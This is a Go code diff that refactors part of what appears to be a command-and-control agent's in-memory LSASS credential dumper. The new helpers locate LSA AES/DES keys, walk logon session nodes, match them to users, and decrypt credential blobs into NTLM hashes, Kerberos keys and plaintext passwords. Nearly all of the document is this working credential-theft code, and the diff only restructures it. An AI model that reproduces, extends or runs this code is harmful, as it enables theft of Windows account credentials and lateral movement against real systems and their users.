@@ -109,32 +109,7 @@ func executeInsituFullInner() structs.CommandResult {
 	if err != nil {
 		return errorf("Phase 2B: %v", err)
 	}
-	var cryptoReport *insituFullCryptoReport
-	var cryptoMaterial lsaCryptoMaterial
-	var cryptoErrStr string
-	var cryptoLayoutName string
-	var cryptoErrs []string
-	for _, cl := range lsaCryptoLayouts {
-		report, material, errStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cl)
-		if material.HasAESKey() || material.HasDESKey() {
-			cryptoReport = report
-			cryptoMaterial = material
-			cryptoLayoutName = cl.Name
-			cryptoErrs = nil
-			cryptoErrStr = ""
-			break
-		}
-		if errStr != "" {
-			cryptoErrs = append(cryptoErrs, cl.Name+": "+errStr)
-		}
-		if report != nil && cryptoReport == nil {
-			cryptoReport = report
-			cryptoLayoutName = cl.Name
-		}
-	}
-	if len(cryptoErrs) > 0 {
-		cryptoErrStr = strings.Join(cryptoErrs, "; ")
-	}
+	cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr := findBestCryptoLayout(reader, lsasrvBytes, mod.Base)
 	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()
 
 	layout := layoutForVariant(sigVariant)
@@ -142,100 +117,27 @@ func executeInsituFullInner() structs.CommandResult {
 
 	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
 	reports := make([]insituFullNodeReport, 0, len(nodes))
-	matchedNodes := 0
-	structParsed := 0
-	nodesWithCreds := 0
-	credBlobsCaptured := 0
-	credBlobsDecrypted := 0
-	hashesExtracted := 0
-	kerbKeysExtracted := 0
-	ptCredsExtracted := 0
+	var matchedNodes, structParsed, nodesWithCreds int
+	var credBlobsCaptured, credBlobsDecrypted, hashesExtracted, kerbKeysExtracted, ptCredsExtracted int
 	dumpLines := make([]string, 0, 8)
 	for _, n := range nodes {
-		preview := 64
-		if len(n.Raw) < preview {
-			preview = len(n.Raw)
-		}
-		report := insituFullNodeReport{
-			Address:       fmt.Sprintf("0x%X", n.Address),
-			Flink:         fmt.Sprintf("0x%X", n.Flink),
-			Blink:         fmt.Sprintf("0x%X", n.Blink),
-			RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
-		}
-		parsed := parseLogonSessionFields(reader, n.Raw, layout)
-		if parsed.LUID != 0 {
+		result := processInsituLogonNode(n, layout, reader, luidIndex, luidsOrdered, matchedLUIDs, canDecrypt, cryptoMaterial)
+		if result.structParsed {
 			structParsed++
-			report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
 		}
-		report.ParsedUserName = parsed.UserName
-		report.ParsedDomain = parsed.Domain
-		report.ParsedAuthPkg = parsed.AuthPackage
-		report.ParsedLogonSrv = parsed.LogonServer
-		if name := logonSessionTypeName(parsed.LogonType); name != "" {
-			report.ParsedLogonType = name
-		}
-		if parsed.CredentialsPtr != 0 {
-			report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
-		}
-		report.ParseErrors = parsed.ParseErrors
-
-		if parsed.LUID != 0 {
-			if _, ok := luidIndex[parsed.LUID]; ok {
-				matchedLUIDs[parsed.LUID] = true
-				report.Phase1Match = true
-				report.Phase1Source = "structured"
-				for _, sess := range luidIndex[parsed.LUID] {
-					report.MatchedUsers = append(report.MatchedUsers,
-						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
-				}
-			}
-		}
-		if !report.Phase1Match {
-			for _, luid := range luidsOrdered {
-				if !scanRawForLUID(n.Raw, luid) {
-					continue
-				}
-				matchedLUIDs[luid] = true
-				report.Phase1Match = true
-				report.Phase1Source = "byte-scan-fallback"
-				for _, sess := range luidIndex[luid] {
-					report.MatchedUsers = append(report.MatchedUsers,
-						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
-				}
-				break
-			}
-		}
-		if report.Phase1Match {
+		if result.matched {
 			matchedNodes++
 		}
-
-		if parsed.CredentialsPtr != 0 {
-			creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
-			if walkErr != nil {
-				report.CredentialWalkErr = walkErr.Error()
-			}
-			if len(creds) > 0 {
-				nodesWithCreds++
-				report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
-				sessionUser := parsed.UserName
-				if sessionUser == "" && len(report.MatchedUsers) > 0 {
-					for _, sess := range luidIndex[parsed.LUID] {
-						if sess.Username != "" {
-							sessionUser = sess.Username
-							break
-						}
-					}
-				}
-				for _, c := range creds {
-					credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser,
-						&credBlobsCaptured, &credBlobsDecrypted, &hashesExtracted,
-						&kerbKeysExtracted, &ptCredsExtracted, &dumpLines)
-					report.Credentials = append(report.Credentials, credReport)
-				}
-			}
+		if result.hasCreds {
+			nodesWithCreds++
 		}
-
-		reports = append(reports, report)
+		credBlobsCaptured += result.credBlobsCaptured
+		credBlobsDecrypted += result.credBlobsDecrypted
+		hashesExtracted += result.hashesExtracted
+		kerbKeysExtracted += result.kerbKeysExtracted
+		ptCredsExtracted += result.ptCredsExtracted
+		dumpLines = append(dumpLines, result.dumpLines...)
+		reports = append(reports, result.report)
 	}
 
 	var unmatched []string
@@ -279,6 +181,133 @@ func executeInsituFullInner() structs.CommandResult {
 		structParsed, matchedLUIDs, luidsOrdered, nodesWithCreds, credBlobsCaptured,
 		cryptoErrStr, cryptoReport, hashesExtracted, kerbKeysExtracted, ptCredsExtracted, dumpLines)
 	return successResult(header + "\n" + string(jsonBytes))
+}
+
+func findBestCryptoLayout(reader lsassReader, lsasrvBytes []byte, modBase uintptr) (*insituFullCryptoReport, lsaCryptoMaterial, string, string) {
+	var cryptoReport *insituFullCryptoReport
+	var cryptoMaterial lsaCryptoMaterial
+	var cryptoLayoutName string
+	var cryptoErrs []string
+	for _, cl := range lsaCryptoLayouts {
+		report, material, errStr := captureLsaCrypto(reader, lsasrvBytes, modBase, cl)
+		if material.HasAESKey() || material.HasDESKey() {
+			return report, material, cl.Name, ""
+		}
+		if errStr != "" {
+			cryptoErrs = append(cryptoErrs, cl.Name+": "+errStr)
+		}
+		if report != nil && cryptoReport == nil {
+			cryptoReport = report
+			cryptoLayoutName = cl.Name
+		}
+	}
+	cryptoErrStr := ""
+	if len(cryptoErrs) > 0 {
+		cryptoErrStr = strings.Join(cryptoErrs, "; ")
+	}
+	return cryptoReport, cryptoMaterial, cryptoLayoutName, cryptoErrStr
+}
+
+type insituNodeResult struct {
+	report             insituFullNodeReport
+	structParsed       bool
+	matched            bool
+	hasCreds           bool
+	credBlobsCaptured  int
+	credBlobsDecrypted int
+	hashesExtracted    int
+	kerbKeysExtracted  int
+	ptCredsExtracted   int
+	dumpLines          []string
+}
+
+func processInsituLogonNode(n logonListNode, layout logonSessionLayout, reader lsassReader,
+	luidIndex map[uint64][]insituSession, luidsOrdered []uint64, matchedLUIDs map[uint64]bool,
+	canDecrypt bool, cryptoMaterial lsaCryptoMaterial) insituNodeResult {
+	preview := 64
+	if len(n.Raw) < preview {
+		preview = len(n.Raw)
+	}
+	report := insituFullNodeReport{
+		Address:       fmt.Sprintf("0x%X", n.Address),
+		Flink:         fmt.Sprintf("0x%X", n.Flink),
+		Blink:         fmt.Sprintf("0x%X", n.Blink),
+		RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
+	}
+	parsed := parseLogonSessionFields(reader, n.Raw, layout)
+	var result insituNodeResult
+	if parsed.LUID != 0 {
+		result.structParsed = true
+		report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
+	}
+	report.ParsedUserName = parsed.UserName
+	report.ParsedDomain = parsed.Domain
+	report.ParsedAuthPkg = parsed.AuthPackage
+	report.ParsedLogonSrv = parsed.LogonServer
+	if name := logonSessionTypeName(parsed.LogonType); name != "" {
+		report.ParsedLogonType = name
+	}
+	if parsed.CredentialsPtr != 0 {
+		report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
+	}
+	report.ParseErrors = parsed.ParseErrors
+
+	if parsed.LUID != 0 {
+		if _, ok := luidIndex[parsed.LUID]; ok {
+			matchedLUIDs[parsed.LUID] = true
+			report.Phase1Match = true
+			report.Phase1Source = "structured"
+			for _, sess := range luidIndex[parsed.LUID] {
+				report.MatchedUsers = append(report.MatchedUsers,
+					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+			}
+		}
+	}
+	if !report.Phase1Match {
+		for _, luid := range luidsOrdered {
+			if !scanRawForLUID(n.Raw, luid) {
+				continue
+			}
+			matchedLUIDs[luid] = true
+			report.Phase1Match = true
+			report.Phase1Source = "byte-scan-fallback"
+			for _, sess := range luidIndex[luid] {
+				report.MatchedUsers = append(report.MatchedUsers,
+					fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
+			}
+			break
+		}
+	}
+	result.matched = report.Phase1Match
+
+	if parsed.CredentialsPtr != 0 {
+		creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
+		if walkErr != nil {
+			report.CredentialWalkErr = walkErr.Error()
+		}
+		if len(creds) > 0 {
+			result.hasCreds = true
+			report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
+			sessionUser := parsed.UserName
+			if sessionUser == "" && len(report.MatchedUsers) > 0 {
+				for _, sess := range luidIndex[parsed.LUID] {
+					if sess.Username != "" {
+						sessionUser = sess.Username
+						break
+					}
+				}
+			}
+			for _, c := range creds {
+				credReport := buildCredentialReport(c, canDecrypt, cryptoMaterial, sessionUser,
+					&result.credBlobsCaptured, &result.credBlobsDecrypted, &result.hashesExtracted,
+					&result.kerbKeysExtracted, &result.ptCredsExtracted, &result.dumpLines)
+				report.Credentials = append(report.Credentials, credReport)
+			}
+		}
+	}
+
+	result.report = report
+	return result
 }
 
 // buildCredentialReport constructs a single credential report entry, performing
